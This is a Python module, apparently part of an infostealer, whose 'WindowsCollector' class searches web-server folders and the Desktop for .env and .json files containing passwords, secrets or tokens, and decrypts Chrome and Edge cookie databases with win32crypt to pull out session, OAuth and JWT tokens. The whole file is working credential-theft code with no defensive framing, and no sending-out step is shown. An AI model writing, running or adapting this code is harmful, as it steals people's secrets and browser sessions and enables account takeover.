import os
import sqlite3
import shutil
import json
import re
import win32crypt

class WindowsCollector:
    def __init__(self, config):
        self.config = config

    def collect(self):
        secrets = []
        paths = [
            "C:\\inetpub\\wwwroot",
            "C:\\xampp\\htdocs",
            os.path.expanduser("~\\Desktop")
        ]
        for base_path in paths:
            if os.path.exists(base_path):
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        if file in self.config.sensitive_files_win or file.endswith('.env') or file.endswith('.json'):
                            full = os.path.join(root, file)
                            try:
                                with open(full, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read(1000)
                                if 'PASSWORD' in content.upper() or 'SECRET' in content.upper() or 'TOKEN' in content.upper():
                                    secrets.append({"source": full, "type": "env", "content": content[:200]})
                            except:
                                pass

        # Extraction des cookies (jetons OAuth)
        cookies = self._extract_cookies()
        if cookies:
            secrets.append({"source": "Browser_Cookies", "type": "cookies", "content": cookies[:5]})

        return {"secrets": secrets}

    def _extract_cookies(self):
        """Extrait les cookies contenant des jetons OAuth/JWT"""
        tokens = []
        browsers = [
            os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
            os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
        ]
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        for path in browsers:
            if os.path.exists(path):
                try:
                    temp = path + ".tmp"
                    shutil.copyfile(path, temp)
                    conn = sqlite3.connect(temp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE name LIKE '%session%' OR name LIKE '%token%' OR name LIKE '%oauth%'")
                    for host, name, encrypted in cursor.fetchall():
                        try:
                            value = win32crypt.CryptUnprotectData(encrypted)[1].decode('utf-8', errors='ignore')
                            if re.search(jwt_pattern, value):
                                tokens.append({"host": host, "name": name, "token": value[:100]})
                        except:
                            pass
                    conn.close()
                    os.remove(temp)
                except:
                    pass
        return tokens